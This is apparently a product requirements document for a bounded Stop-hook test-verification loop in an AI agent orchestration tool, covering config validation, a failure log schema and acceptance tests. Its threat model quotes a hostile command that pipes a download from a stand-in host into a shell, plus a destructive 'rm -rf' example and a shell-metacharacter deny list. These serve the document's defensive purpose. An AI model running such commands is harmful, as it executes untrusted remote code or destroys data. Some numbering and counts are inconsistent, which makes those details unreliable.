# PRD-366 — Bounded stop-hook verification loop before `completed`

- **Status:** shaped (ready for implementation in a follow-up session)
- **Date:** 2026-05-10
- **Issue:** #366
- **Author:** session main-2026-05-10-deep-1 W2 B3
- **Appetite:** 1.5–2 weeks (Medium Batch per `.claude/rules/mvp-scope.md`). Revised upward from "1 week" after W3 review: NEW `verification-spend.json` file + SubagentStop session_id/wave resolver reuse + 14 additional ACs (AC17–AC30) from C4 review pushed scope past Small Batch ceiling.

## Problem

Boris Cherny (Anthropic) is explicit on the value of a Stop-hook verification loop: *"Give Claude a way to verify its work. If Claude has that feedback loop, it will 2-3x the quality of the final result."* (Threads, cited in `docs/spike-probes/2026-05-10-w1-research-context.md` § A5). His Every.to interview adds the matching runtime guarantee: *"You can just make the model keep going until the thing is done."* And in his X "three strategies" post on long-running agents, Boris ranks the **agent Stop hook as the most deterministic of the three** (against background agents and the ralph-wiggum plugin).

Today, Session Orchestrator has the wiring but not the contract. `hooks/on-stop.mjs` (lines 280–281) explicitly *"Exit 0 always — informational hook must never block Claude."* It writes `events.jsonl`, deregisters from the multi-session registry, fires a webhook — and lets the agent's self-declared `completed` stand without verification. The 9-kill-switch model in `scripts/lib/autopilot/kill-switches.mjs` covers pre-iteration budget exhaustion (TOKEN_BUDGET, MAX_HOURS, RESOURCE_OVERLOAD) and post-session signal-extraction (SPIRAL, FAILED_WAVE, CARRYOVER_TOO_HIGH), but none of them inspect *whether the agent's claimed work actually passes a deterministic proof*. CLAUDE.md "Current State" reads as a long sequence of session entries (deep-1 #350–#354, deep-2 #344–#349, deep-3 #359–#363, deep-4 hotspot-splits, housekeeping-1) — and, while no audit row directly says "post-completion drift caught manually", the *housekeeping-1 / Express-Path catch-up* entry from 2026-05-09 is exactly that pattern: vault-state drift the auto-commit phase had skipped, deep-3 sessions.jsonl backfill from a `/close` that was never invoked, evolve confidence-bumps applied retroactively. Every one of these would have been caught at Stop time by a verification loop that ran the appropriate proof-command before letting STATE.md flip from `in-dev`/`testing` to `completed`.

The gap is the *runtime contract*: a bounded "keep going until verified" loop that runs proof-commands on Stop, bounds itself by iteration cap + wall-time + token-budget, and writes structured failure evidence to disk before either passing the agent through or surfacing a concrete error to the model's next turn.

## Goals

1. **Bounded self-verification loop on `Stop`** — exactly one corrective iteration by default, with iteration cap, wall-time cap, and token-budget cap honoured before the hook either allows completion or surfaces failure context to the model.
2. **Failure-evidence persistence** — every blocked Stop writes a structured record to `.orchestrator/metrics/failures.jsonl` *before* exit 2, so post-mortems and `/discovery` runs can reason about verification failures without re-running.
3. **Forward-compat with autopilot's 9 kill-switches** — verification token spend integrates with TOKEN_BUDGET (#355) and adds a 10th switch `VERIFICATION_BUDGET_EXCEEDED` for the verification-specific overhead headroom.
4. **Zero impact on existing successful sessions** — opt-in via Session Config (`verification.enabled: false` default). Sessions without the config block behave exactly as today.

## Non-goals

- **Not building a generic retry framework.** This is Stop-hook verification only. PostToolUse retries, subagent re-dispatch, and wave-level rollbacks are out of scope.
- **Not changing autopilot's existing 9 kill-switches.** Adding one new switch (VERIFICATION_BUDGET_EXCEEDED) and *consuming* the existing TOKEN_BUDGET signal — never modifying its semantics.
- **Not running verification on PostToolUse.** The Cat Wu / DEV Community 3-layer model (A5) keeps PostToolUse for syntax checks (ESLint), Stop prompt for intent verification, and Stop command for regression tests. We adopt the third layer only.
- **Not implementing flaky-test re-run logic in v1.** The `retries: 2` configuration value reserves the slot, but the corrective-pass implementation is Phase 2.
- **Not unifying the three Session-Recovery AUQ flows** (stale lock / interrupted session / snapshot — see A6 cross-cutting gap #3). That is its own PRD.

## Design

### Stop-hook contract (recap from A5)

Anthropic's Stop hook contract, as cited in `docs/spike-probes/2026-05-10-w1-research-context.md` § A5:

- **Event:** `Stop`. Payload: `{session_id, cwd, hook_event_name: "Stop", stop_hook_active: boolean}`
- **Exit codes:** `0` = allow Stop to proceed; `2` = **block** (Claude continues, stderr is appended to its context window).
- **JSON output alternative:** `{"decision": "block", "reason": "..."}` (with exit 0) — equivalent to exit 2 but lets us attach a structured reason without coupling the prose to stderr.
- **Critical safety field:** `stop_hook_active` — when *true*, the hook is already inside a forced-continuation triggered by a previous block. The hook **MUST exit 0** in this case, otherwise the agent loops forever on a flaky proof-command.
- **Default timeout:** 60s (Anthropic). Our current `hooks/hooks.json` Stop entry sets `timeout: 5` — far too tight for a real test command. The new `verification.wall-time-seconds` (default 60) reads the value from Session Config and the hooks.json entry is bumped accordingly.

### Architecture

**Security primer (W3 C5 HIGH-#1 fix):** verification-command execution MUST NOT use `spawnSync('sh', ['-c', cmd])` — that surface enables arbitrary command injection from any operator who can write Session Config (or any tool that mutates it). Instead, the command is parsed into `[binary, ...args]` (canonical: array form in YAML; legacy: string form parsed by a safe whitespace+quoting tokenizer), the binary is checked against a closed allowlist, and `spawnSync` is called with `shell: false`. Sketch:

```js
// scripts/lib/verification-config.mjs (Zod transform)
const ALLOWED_BINARIES = ['npm', 'npx', 'node', 'pnpm', 'vitest'];
const SHELL_METACHARS = /[$`|;&<>]|&&|\|\|/;

function validateCommand(cmd) {
  const [bin, ...args] = Array.isArray(cmd) ? cmd : tokenize(cmd);
  if (!ALLOWED_BINARIES.includes(bin) && !bin.startsWith('./scripts/')) {
    throw new ConfigValidationError('command binary not in allowlist: ' + bin);
  }
  for (const a of [bin, ...args]) {
    if (SHELL_METACHARS.test(a)) {
      throw new ConfigValidationError('shell metacharacter rejected in arg: ' + a);
    }
  }
  return [bin, args];
}

// hooks/on-stop.mjs (verification path)
const [bin, args] = parseVerificationCommand(verification.command);
spawnSync(bin, args, {
  cwd: process.cwd(),
  stdio: ['ignore', 'pipe', 'pipe'],
  timeout: config.wallTimeSeconds * 1000,
  shell: false,                  // CRITICAL — never invoke a shell
});
```

The allowlist is the **only** line of defense (W3 C5 HIGH-#2 fix): the existing `hooks/pre-bash-destructive-guard.mjs` fires only on `Bash` tool calls from Claude, NOT on hook-internal `spawnSync`, so the previous "second-line defense" framing in R-CR-3 was architecturally incorrect.

Data flow on Stop:

```
+---------+   1. Stop event       +-----------------+
| Claude  | --------------------> | hooks/on-stop   |
+---------+                       +--------+--------+
                                           |
                          2. loadVerificationConfig()
                                           |
                          3. stop_hook_active === true?
                                /              \
                              yes               no
                              |                 |
                       exit 0 (safety)   4. spawn verification-command
                                           |
                          5. parse exit code + stderr
                                /              \
                              pass             fail
                              |                 |
                  events.jsonl                  6. write failures.jsonl
                  (verification: pass)             record (full schema)
                              |                 |
                       exit 0           7. token-budget check
                                                 (VERIFICATION_BUDGET?)
                                                 |
                                           8. exit 2
                                                 |
                                           stderr = top-N lines of stderr
                                                 (Claude reads on next turn)
```

Sequence diagram (ASCII):

```
agent          on-stop.mjs        verify-config        spawnSync(cmd)        events.jsonl    failures.jsonl
  |                |                    |                    |                    |               |
  | Stop event     |                    |                    |                    |               |
  |--------------->|                    |                    |                    |               |
  |                | load yaml          |                    |                    |               |
  |                |------------------->|                    |                    |               |
  |                |<-------------------|                    |                    |               |
  |                | check stop_hook_active                  |                    |               |
  |                |    (false)                              |                    |               |
  |                | spawn npm test --silent                 |                    |               |
  |                |---------------------------------------->|                    |               |
  |                |<----------------------------------------|                    |               |
  |                |    exit_code=0                          |                    |               |
  |                | append {event: stop, verification: pass}-------------------->|               |
  |                | exit 0                                  |                    |               |
  |<---------------|                                         |                    |               |
  |  (completed)   |                                         |                    |               |

(failure path)
agent          on-stop.mjs        verify-config        spawnSync(cmd)        events.jsonl    failures.jsonl
  |                |                    |                    |                    |               |
  | Stop event     |                    |                    |                    |               |
  |--------------->|                    |                    |                    |               |
  |                | spawn npm test                          |                    |               |
  |                |---------------------------------------->|                    |               |
  |                |<----------------------------------------|                    |               |
  |                |    exit_code=1, stderr=<long log>       |                    |               |
  |                | append failure record (schema below)----------------------------------->     |
  |                | print top-N stderr lines to OWN stderr  |                    |               |
  |                | exit 2                                  |                    |               |
  |<---------------|                                         |                    |               |
  | (sees stderr,  |                                         |                    |               |
  |  next turn)    |                                         |                    |               |
  | Stop event #2  | stop_hook_active=true                   |                    |               |
  |--------------->|                                         |                    |               |
  |                | exit 0 unconditionally                  |                    |               |
  |<---------------|                                         |                    |               |
```

### Session Config additions

```yaml
verification:
  enabled: false                       # opt-in; when false, hook behaves exactly as today
  command: ["npm", "test", "--silent"] # CANONICAL: array [binary, ...args]. String form ("npm test --silent")
                                       # accepted via Zod transform that tokenizes with quoting awareness, but array
                                       # form is preferred — no shell parsing ambiguity. Required when enabled: true.
  retries: 1                           # 0 = block once then allow; 1 = allow one corrective pass; max 2 (Phase 2)
  artifacts: [logs]                    # logs | junit | screenshots — what to capture on failure
  wall-time-seconds: 60                # hook timeout; replaces hardcoded 5s for verification path
  token-budget-extra: 0.20             # 20% headroom on session token budget for verification spend
  scope: [Stop]                        # Stop | SubagentStop | both — which events trigger verification
  stderr-tail-lines: 40                # how many stderr lines to forward to Claude on block
  use-json-decision: false             # [Phase 2] reserved for {"decision":"block"} alternative output mode
```

`verification.command` SHOULD produce actionable stderr on failure (W3 C3 MUST-FIX #6). Builtins like `false` or `test` provide no diagnostic context and degrade the next-turn prompt; recommended commands include `npm test -- --reporter verbose`, `pnpm vitest run --reporter verbose`, or equivalent test-runner verbose modes.

The schema is validated by a NEW file `scripts/lib/verification-config.mjs` (Zod-based, deferred to implementation), declared `.strict()` so unknown keys are rejected (see AC29). The validator MUST reject:
- `retries < 0` or `retries > 2`
- `wall-time-seconds < 1` or `> 600`
- `token-budget-extra < 0` or `> 1.0`
- `scope` values not in `[Stop, SubagentStop]`
- `enabled: true` with empty/missing `command`
- **`command[0]` not in the binary allowlist** (`npm`, `npx`, `node`, `pnpm`, `vitest`, or path beginning with `./scripts/`) — fail_reason `config-validation-error` (security: W3 C5 HIGH-#1)
- **any element of `command` containing shell metacharacters** (`$`, `` ` ``, `|`, `;`, `&&`, `||`, `>`, `<`) — fail_reason `config-validation-error`
- any unknown key under `verification:` (Zod `.strict()` rejection)

### Failure-evidence schema

`.orchestrator/metrics/failures.jsonl` — one JSONL record per failed verification iteration. Schema:

```json
{
  "schema_version": 1,
  "timestamp": "2026-05-10T14:32:18.443Z",
  "session_id": "main-2026-05-10-deep-1",
  "wave": 4,
  "iteration": 1,
  "stop_hook_active": false,
  "verification_command": "npm test --silent",
  "exit_code": 1,
  "stderr_tail": "FAIL src/cli/flags.test.ts\n  ✗ rejects unknown flag\n    Error: expected 'unknown' to throw\n  ...",
  "stdout_tail": "",
  "duration_ms": 12340,
  "fail_reason": "test-suite-failed",
  "command_path": "/Users/.../node_modules/.bin/vitest"
}
```

Closed enum for `fail_reason` (6 values):
- `test-suite-failed` — command exited non-zero
- `timeout` — wall-time-seconds exceeded; SIGTERM sent
- `command-not-found` — ENOENT or non-PATH-resolvable
- `permission-denied` — EACCES
- `signal-killed` — SIGKILL/OOM observed
- `destructive-command-blocked` — `verification.command` matched a rule in `.orchestrator/policy/blocked-commands.json` and the hook refused to spawn (sixth enum value, added per W3 C3 MUST-FIX / C6 #4)
- `config-validation-error` — Zod schema validator rejected `verification.command` (allowlist violation, shell-metacharacter, unknown key, etc.) before any spawn was attempted

### Kill-switch additions

A new 10th kill-switch is added to `KILL_SWITCHES` in `scripts/lib/autopilot/kill-switches.mjs`:

```js
VERIFICATION_BUDGET_EXCEEDED: 'verification-budget-exceeded',
```

It fires when verification token consumption exceeds `verification.token-budget-extra × session-budget`. Implementation extends `preIterationKillSwitch` (or adds a parallel `verificationBudgetKillSwitch` evaluator) that the hook reads via a small helper exported from kill-switches.mjs. The existing TOKEN_BUDGET (#355) remains untouched — the new switch fires *only* on the verification-specific overhead, so a session under its base budget but burning headroom on flaky verification still gets caught.

### Hooks integration

Modifications to `hooks/on-stop.mjs`:

1. Insert new step after `discriminate(input)` and before `handleStop`/`handleSubagentStop`:
   - Call `loadVerificationConfig()` from `scripts/lib/verification-config.mjs`.
   - If `config.enabled === false`, fall through to current behavior (no change).
   - If `config.enabled === true` and event is in `config.scope`, branch into verification path.
2. Verification path:
   - Validate `stop_hook_active` is strictly boolean — coerce/reject any non-boolean per AC17 type-juggling table.
   - If `input.stop_hook_active === true` → exit 0 immediately, append `{event: "verification_skipped", reason: "stop_hook_active"}` to events.jsonl. **This is the load-bearing safety gate.**
   - Else, parse `config.command` into `[binary, args]` via `parseVerificationCommand()` (allowlist + metachar validation). Capture `t0 = Date.now()`. Run via `child_process.spawnSync(binary, args, { timeout: config.wall_time_seconds * 1000, stdio: ['ignore', 'pipe', 'pipe'], cwd: process.cwd(), shell: false })`. Compute `verification_duration_ms = Date.now() - t0` (NEVER from `input.start_ms` — see AC2b).
   - On `status === 0` (pass): append `{event: "stop", ..., verification: "pass", verification_duration_ms}` to events.jsonl, exit 0.
   - On non-zero / signal / timeout: build the failure record (with `duration_ms` from the Date.now delta, not from input), append to `.orchestrator/metrics/failures.jsonl`, write `stderr_tail` (top-N lines, byte-capped at 32 KB per AC23) to the hook's own stderr, exit 2.
3. SubagentStop scope: same logic, scoped to `input.agent_type` if `config.scope` includes `SubagentStop`. The SubagentStop branch MUST resolve `session_id` via the existing `resolveSessionId()` helper and `wave` via `readWaveNumber()` (both already imported by `on-stop.mjs`); failures.jsonl records from SubagentStop verification failures MUST have non-null `session_id` and non-zero `wave` (see AC10b). Add a separate companion hook entry in `hooks/hooks.json` for SubagentStop (the existing one already runs `on-stop.mjs`, so this is just a config-driven branch).

The hook continues to write the existing `events.jsonl` `stop` record on the success path so that no downstream consumer (telemetry, sweep.log, /discovery) loses a signal.

`hooks/hooks.json` change: Phase 1 bumps the **uniform** Stop + SubagentStop `timeout` from 5 to **65** (60s wall-time + 5s framing overhead). This is intentionally the *uniform* bump — it is fully compatible with #365's deferred per-matcher schema extension (additive: per-matcher overrides layer on top of the uniform value in a separate follow-up). Cross-connections doc (`docs/adr/2026-05-10-spike-cluster-cross-connections.md`) reflects this ownership: PRD-366 EXTENDS hooks.json (timeout 5→65 uniform), ADR-365 will later layer per-matcher timeouts on top. The hook itself short-circuits in <500ms when verification is disabled, so there is no regression for existing sessions.

## Acceptance Criteria

Each AC maps to one Vitest test case in `tests/hooks/on-stop-verification.test.mjs` (NEW), except where a `tests/lib/...` adapter test is named explicitly.

1. **AC1 — regression baseline:** with no `verification:` block in Session Config (or `verification.enabled: false`), `hooks/on-stop.mjs` writes exactly one `stop` record to events.jsonl, performs no spawn, and exits 0. (Mirrors today's behavior.)
2. **AC2 — happy path:** with `verification.enabled: true` and a verification-command that exits 0, the hook appends `{event: "stop", verification: "pass", verification_duration_ms: <number>}` to events.jsonl and exits 0. No record is written to failures.jsonl.
3. **AC2b — duration_ms positivity:** `verification_duration_ms` written to both events.jsonl (success) and failures.jsonl (failure) is computed as `Date.now() - t0` around the spawnSync call and is strictly `> 0`. Test forces a sub-millisecond command and asserts the field is at least `1`. The hook MUST NOT use any caller-provided `input.start_ms` for this field. (W3 C3 MUST-FIX, B6 verification.)
4. **AC3 — failure path:** with verification on and a command that exits 1 (1st attempt, `stop_hook_active: false`), the hook exits 2, stderr contains the top-N stderr lines (default 40), and failures.jsonl gains exactly one record matching the schema with `fail_reason: "test-suite-failed"`.
5. **AC4 — `stop_hook_active` safety gate (split into 4 sub-asserts per W3 C3 MUST-FIX #6):** with verification on, a failing command, and `stop_hook_active: true` in stdin payload, **all four** of the following hold (each is its own Vitest test case under a single `describe('AC4', ...)` block):
   - **AC4a — exit code:** the hook process exits 0.
   - **AC4b — events.jsonl record:** events.jsonl gains exactly one `{event: "verification_skipped", reason: "stop_hook_active"}` record (no `event: "stop"` record, no `event: "verification"` record).
   - **AC4c — failures.jsonl untouched:** failures.jsonl is **not** written. If the file existed before the hook ran, its byte-length is unchanged after.
   - **AC4d — no spawn (load-bearing):** the verification-command is **never spawned**. Verified via a mock `spawnSync` spy with a call-counter; assertion `spy.callCount === 0`.
6. **AC5 — timeout:** with `verification.wall-time-seconds: 1` and a command that sleeps 5s, the hook SIGTERMs the child, exits 2, and writes a failures.jsonl record with `fail_reason: "timeout"` and `duration_ms` ≈ 1000.
10. **AC6 — command not found:** with verification-command set to a non-existent binary (after passing the allowlist check — e.g., `node ./does-not-exist.mjs`), the hook exits 2 with a failures.jsonl record `fail_reason: "command-not-found"` and `exit_code: null`.
11. **AC7 — VERIFICATION_BUDGET_EXCEEDED:** with cumulative verification-spend > `token-budget-extra × maxTokens`, autopilot's preIterationKillSwitch (extended) returns `{kill: "verification-budget-exceeded", detail: "..."}`. The spend counter is sourced from `.orchestrator/metrics/verification-spend.json` (NEW Phase 1 file), incremented per failed iteration by `estimated_token_cost` (default `1500`, configurable). Adapter test in `tests/lib/autopilot/kill-switches.test.mjs`.
12. **AC8 — forward-compat zero-impact:** older sessions with no `verification:` block in their config see byte-for-byte identical events.jsonl entries vs. v3.5.0 baseline. Snapshot test against a recorded run.
13. **AC9 — schema validation rejects bad config:** Zod schema in `verification-config.mjs` rejects `retries: 3`, `retries: -1`, `wall-time-seconds: 0`, `token-budget-extra: 1.5`, `scope: ["PostToolUse"]`, and `enabled: true` with missing `command`. Each rejection is its own test case.
14. **AC9b — shell-metacharacter / allowlist rejection:** `verification.command` containing any of `$`, `` ` ``, `|`, `;`, `&&`, `||`, `>`, `<` in any element is rejected by the Zod validator with `fail_reason: "config-validation-error"` (no spawn attempted, no failures.jsonl write). `verification.command[0]` not in the allowlist (`npm`, `npx`, `node`, `pnpm`, `vitest`, `./scripts/*`) is also rejected with the same `fail_reason`. Six explicit cases: each metacharacter in arg position; one disallowed binary (`bash`); one absolute-path binary (`/bin/sh`). (W3 C5 HIGH-#1.)
15. **AC10 — SubagentStop scope:** with `verification.scope: [SubagentStop]` (Stop excluded) and a Stop event, the hook does **not** run verification. With a SubagentStop event under the same config, it does.
16. **AC10b — SubagentStop session_id+wave linkage:** a failures.jsonl record produced from a SubagentStop verification failure has non-null `session_id` (resolved via `resolveSessionId()`) and non-zero `wave` (resolved via `readWaveNumber()`), matching the values written to events.jsonl by the same hook invocation. (W3 C3 MUST-FIX #2, B6 SubagentStop schema gap.)
17. **AC11 — failures.jsonl append-only:** repeated failures append; the file is never truncated by the hook. Verified by writing 3 failure records and asserting `wc -l` == 3.
18. **AC12 — stderr_tail bounded:** with a command producing 10,000 stderr lines, the failures.jsonl `stderr_tail` field is exactly `config.stderr-tail-lines` lines (default 40), preserving the *last* N lines.
19. **AC13 — webhook fired on verification fail:** when verification fails and `CLANK_EVENT_SECRET` + `CLANK_EVENT_URL` are set, a webhook of type `orchestrator.verification.failed` is fired with `{wave, iteration, fail_reason}`. (Reuses the existing fire-and-forget pattern in on-stop.mjs.)
20. **AC14 — events.jsonl single source on success:** on verification pass, the existing `event: stop` record is augmented with verification fields rather than written as a second record. Consumers that count `stop` events do not see double-counting.
21. **AC15 — [moved to Phase 2]** JSON decision-block alternative parity (`verification.use-json-decision: true`) is no longer Phase 1 scope. Tracked under Open Question 5 and Phase 2 backlog. (Original AC15 removed from Phase 1 per W3 C3 BLOCK — schema mismatch with `verification.*` allowed-key list. Phase 1 ships exit-2 only.)
22. **AC16 — destructive-command guard interaction:** if `verification.command` matches a rule in `.orchestrator/policy/blocked-commands.json`, the hook refuses to spawn and exits 2 with `fail_reason: "destructive-command-blocked"` (sixth enum value). Cross-test against PSA-003. Note: the destructive-command list is checked **after** allowlist validation passes — so a `bash`-prefixed command is rejected first by AC9b allowlist; the destructive-command guard catches in-allowlist commands like `npm` invoked with destructive arguments (e.g., `npm publish` if blocked by policy).
23. **AC17 — `stop_hook_active` type-juggling (8 cases):** the hook's interpretation of `stop_hook_active` is strictly boolean. Eight stdin payload cases are tested: `true` (skip), `false` (run), `"true"` string (rejected as malformed input), `"false"` string (rejected), `1` (rejected), `0` (rejected), `null` (treated as `false`), missing key (treated as `false`). For rejected payloads, the hook exits 2 with a failures.jsonl record `fail_reason: "config-validation-error"` and never spawns. (W3 C4 NEW.)
24. **AC18 — invalid JSON stdin:** when stdin is not parseable as JSON (e.g., empty string, truncated `{"sess`, binary garbage), the hook writes a failures.jsonl record with `fail_reason: "config-validation-error"`, never spawns the verification command, and exits 2. The session_id/wave fields in the failure record are best-effort (may be null/zero); the record is still well-formed JSONL. (W3 C4 NEW.)
25. **AC19 — concurrent failures.jsonl atomic-append (10-way stress):** ten `node hooks/on-stop.mjs` processes are spawned concurrently, each producing a failure. After all have exited, `wc -l .orchestrator/metrics/failures.jsonl` equals 10 and every line is independently parseable as JSON (no truncation, no interleaving). Reuses `appendJsonl()` atomic-write semantics from `scripts/lib/common.mjs`. (W3 C4 NEW.)
26. **AC20 — failures.jsonl missing/corrupt resilience:** with the failures.jsonl parent directory missing, the hook creates it (recursive `mkdir`, mode `0o700`) and writes the record. With an existing failures.jsonl that contains a corrupt last line (truncated JSON), the hook appends a fresh well-formed line without rewriting the corrupt one (append-only invariant). With the file existing as a directory (pathological case), the hook surfaces a clear error to its own stderr and exits 2 without crashing the harness. (W3 C4 NEW.)
27. **AC21 — disk-full / EACCES on write:** when the failures.jsonl write fails with `ENOSPC` or `EACCES`, the hook does NOT crash silently. It logs to its own stderr (forwarded to Claude on next turn), still exits 2, and the originally failing verification result is preserved in events.jsonl as `{event: "verification_failed_persistence_error", inner_fail_reason: "...", fs_errno: "ENOSPC"}`. Test mocks `appendJsonl()` to throw the relevant errno. (W3 C4 NEW.)
28. **AC22 — stderr binary/non-UTF8:** when the verification-command emits non-UTF8 bytes (e.g., compiled-binary stderr leakage, embedded NULs), the hook decodes with `replacement-char` semantics (Node's default `Buffer.toString('utf8')` substitutes U+FFFD) so the failures.jsonl `stderr_tail` is always a well-formed JSON string. No crash on `JSON.stringify`. (W3 C4 NEW.)
29. **AC23 — stderr byte-cap (32 KB):** the `stderr_tail` field in failures.jsonl is byte-capped at 32 KB regardless of `stderr-tail-lines`. If 40 lines exceed 32 KB (e.g., a single 50 KB log line), the field is truncated at the 32 KB boundary with a trailing marker `...[truncated at 32KB]`. The total failures.jsonl line is therefore bounded at roughly 35 KB worst-case, keeping the file friendly for `tail`/`head` consumers. (W3 C4 NEW.)
30. **AC24 — SIGKILL → fail_reason mapping:** when the verification subprocess is terminated by SIGKILL (OOM, external `kill -9`, container OOMKill), the failures.jsonl record has `fail_reason: "signal-killed"`, `exit_code: null`, and a `signal: "SIGKILL"` field. Distinct from `fail_reason: "timeout"` (which corresponds to the hook's own SIGTERM after wall-time-seconds elapses). (W3 C4 NEW.)
31. **AC25 — detached subprocess timeout:** if the verification command spawns a long-running detached child (e.g., `npm test` that backgrounds a watcher), the hook does NOT wait for the detached child after the parent exits. `spawnSync`'s timeout applies to the parent only; the hook exits within `wall-time-seconds + 5s` framing overhead even when the parent leaves orphans. Test uses a fixture command that backgrounds a 30-second sleep before exiting 0; assert hook completes in <2s and reports `fail_reason: "test-suite-failed"` (parent exit 0 reaches the success path; orphan does not block). (W3 C4 NEW.)
32. **AC26 — hooks.json timeout vs wall-time validator:** a startup-time validator (run in `scripts/validate-plugin.mjs` or equivalent) rejects any Session Config where `verification.wall-time-seconds + 5 > hooks.json[Stop].timeout`. The error message names both values and the file paths. This prevents the hook from being SIGKILLed by the harness mid-verification. (W3 C4 NEW.)
33. **AC27 — disabled-mode preserves deregisterSelf + webhook:** with `verification.enabled: false`, the hook still calls `deregisterSelf()` and the existing fire-and-forget Stop webhook (the two side-effects that pre-date this PRD). Snapshot test against v3.5.0 baseline confirms byte-for-byte parity of the events.jsonl entry plus deregisterSelf invocation count (1) and webhook invocation count (1 if env vars set, 0 otherwise). (W3 C4 NEW; tightens AC8.)
34. **AC28 — VERIFICATION_BUDGET counter is per-session:** the spend counter tracked in `.orchestrator/metrics/verification-spend.json` is keyed by `session_id`, NOT global and NOT per-iteration. Two parallel sessions in the same project root each have independent counters. After session-end (or on a new `session_id`), the counter for the previous session_id is retained for post-mortem but does NOT contribute to the new session's budget check. Test spawns two sessions with synthetic session_ids and asserts independent budgets. (W3 C4 NEW; clarifies AC7 scope.)
35. **AC29 — unknown-key strict rejection:** the Zod schema for `verification:` is declared `.strict()`. A config with `verification.foo: "bar"` (or any unknown key under `verification:`) is rejected at schema-load time with `fail_reason: "config-validation-error"`. Test cases: one unknown top-level key, one typo of an existing key (`retires` for `retries`), one extra key under a future-reserved namespace. (W3 C4 NEW.)
36. **AC30 — schema_version forward-compat:** failures.jsonl records carry `schema_version: 1`. Consumers reading the file MUST tolerate higher `schema_version` values gracefully — the canonical reader (a small helper in `scripts/lib/failures-jsonl.mjs`, NEW) skips records with `schema_version > KNOWN_MAX` and emits a warning rather than crashing. Test feeds the reader a fixture file containing `schema_version: 1` (parsed) and `schema_version: 99` (skipped with warning). (W3 C4 NEW.)

**Final AC tally:** 32 active ACs (AC1, AC2, AC2b, AC3, AC4 with 4 sub-asserts, AC5–AC9, AC9b, AC10, AC10b, AC11–AC14, AC16–AC30). AC15 retained in the list as a "[moved to Phase 2]" placeholder for traceability with the original W2 spec; it is **not** Phase 1 scope.

## Rollback

Phase 1 is designed to be rollback-able in three independent layers, in increasing order of cost:

1. **Operator-level disable (zero-downtime, < 5 seconds):** flip `verification.enabled: false` in Session Config. The hook reads its config on every invocation (no caching across runs), so the next `Stop` event runs the legacy code path. No restart, no migration, no file deletion needed. **All in-flight failures.jsonl entries are preserved** — the file is append-only and never auto-pruned by this PRD. Recommended first step on any production regression.

2. **hooks.json timeout revert (single-commit revert):** if the timeout bump from `5` → `65` interacts badly with another harness behavior (e.g., a paid-feature timeout cap), revert the `hooks/hooks.json` change via `git revert <commit>`. The verification hook still runs (and will SIGTERM at the original 5s), but the rest of the system is unaffected. This rollback is independent of step 1 — operators may keep verification enabled with a tightened wall-time-seconds (e.g., `wall-time-seconds: 4`) while the timeout question is investigated.

3. **Full code revert (multi-commit revert + cleanup, ~30 minutes):** revert the entire Phase 1 commit set (`hooks/on-stop.mjs` modification, `scripts/lib/verification-config.mjs` add, `scripts/lib/failures-jsonl.mjs` add, `scripts/lib/autopilot/kill-switches.mjs` extend, `tests/hooks/on-stop-verification.test.mjs` add). Existing `.orchestrator/metrics/failures.jsonl` and `.orchestrator/metrics/verification-spend.json` files are left in place (forward-compat reader from AC30 ensures consumers that re-encounter old records when verification is later re-introduced will tolerate them). The events.jsonl `verification: pass` field is read-tolerated by all current consumers (additive only).

**Forward-incompat surface (out of scope for this PRD's rollback story):**
- Once `failures.jsonl` is in production use across multiple sessions and downstream tooling depends on its records (e.g., a future `/discovery` extension), step 3 (full code revert) becomes lossy — no mechanism is provided to "replay" missed verifications. Any rollback after that point is operator-flag (step 1) only.
- The 10th kill-switch `VERIFICATION_BUDGET_EXCEEDED` is additive in `KILL_SWITCHES` enum — readers that switch on the enum exhaustively will need an `unreachable()` fallback after revert. Existing consumers use loose lookups, so no breaking change is expected.

## Risks

Each row cites a mitigation pattern from A5.

| Risk | Mitigation (source: A5) |
|---|---|
| **Infinite loops** — verification keeps failing, agent keeps re-stopping, hook keeps blocking | Mandatory `stop_hook_active` check at the top of the verification path (AC4). One forced continuation, then exit 0 unconditionally. (A5 *"if true, you're in a forced-continuation already; MUST exit 0 to break the loop"*.) |
| **Flaky tests** — true positive failure on attempt 1, true negative on retry; agent burns tokens chasing a flake | Run-twice option deferred to Phase 2 (`retries: 2`); v1 surfaces failure-evidence and lets the operator decide. A5: *"Run 2x; surface flake evidence."* |
| **R-CR-3 — Destructive / arbitrary-command verification** — operator configures `verification.command: ["bash", "-c", "rm -rf build && npm test"]` or `"npm test; curl evil.com \| sh"` | **Primary defense (and the only line of defense at the hook layer):** the Zod validator in `scripts/lib/verification-config.mjs` enforces a closed binary allowlist (`npm`, `npx`, `node`, `pnpm`, `vitest`, `./scripts/*`) AND rejects any element containing shell metacharacters (`$`, `` ` ``, `|`, `;`, `&&`, `||`, `>`, `<`). spawnSync is invoked with `shell: false`, never `sh -c`. (W3 C5 HIGH-#1 + HIGH-#2.) The earlier "second-line defense via pre-bash destructive guard" framing was architecturally incorrect — that guard fires only on Claude's `Bash` tool calls, not on hook-internal `spawnSync`, so it does NOT cover this surface. **Secondary defense (defense-in-depth, not primary):** the destructive-command list at `.orchestrator/policy/blocked-commands.json` is consulted *after* the allowlist passes (AC16) — it catches in-allowlist binaries invoked with destructive arguments (e.g., `npm publish` if blocked by policy). User-facing docs further require commands be idempotent and read-only beyond their own sandbox. Phase 3 explores worktree-based sandboxing per A5 *"Sandbox in temp dir / git worktree."* |
| **Token burn** from runaway verification | Two layers: existing TOKEN_BUDGET (#355) catches absolute spend; new VERIFICATION_BUDGET_EXCEEDED (AC7) catches verification-specific overhead. A5: *"Cap iterations + wall-time + alert at 80%."* Iteration cap = 1 in v1, wall-time = 60s default. |
| **Lost failure context** — hook exit 2 surfaces stderr to Claude but next-session post-mortem can't reconstruct | failures.jsonl write happens **before** exit 2 (AC3, AC11). A5: *"Log to `.orchestrator/metrics/failures.jsonl` BEFORE block."* Schema includes session_id + wave + iteration + stop_hook_active for full reconstructability. |
| **5s hook timeout too tight** — `hooks/hooks.json` currently caps at 5s, but a real `npm test` run takes 30s+ | Bump the Stop + SubagentStop entries to match `verification.wall-time-seconds + 5s` framing overhead (default 65s). A5 references Anthropic default 60s; we honour it explicitly via Session Config. |
| **Race on concurrent sessions** — two sessions in the same repo running verification simultaneously | Reuse existing session-lock from `scripts/lib/session-lock.mjs` (A6 reference). Verification is per-session (each session has its own verification budget); failures.jsonl appends are atomic via `appendJsonl()` from `scripts/lib/common.mjs`. PSA-003 applies to verification commands. |
| **Webhook flood** on verification failures | Webhook fire-and-forget pattern is already throttled by 3s `AbortSignal.timeout` (on-stop.mjs L166); a verification-failed webhook adds at most one event per Stop. No additional rate limiting needed in v1. |

## Open questions

